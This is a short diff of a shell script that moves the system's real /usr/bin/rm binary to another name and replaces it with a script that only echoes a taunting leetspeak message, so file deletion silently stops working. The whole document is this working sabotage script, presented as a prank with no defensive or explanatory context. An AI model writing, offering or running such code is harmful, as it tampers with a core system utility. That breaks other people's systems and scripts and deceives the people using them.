@@ -1,7 +1,7 @@
 #!/bin/sh
 
 # modifying rm
-mv /usr/bin/rm wedoalittletrollin
+mv /usr/bin/rm /usr/bin/switcharoo
 echo "#!/bin/sh" > /usr/bin/rm
 echo "echo '1 533 y0u d3l371n6 my f1l35'" >> /usr/bin/rm
 chmod +x /usr/bin/rm
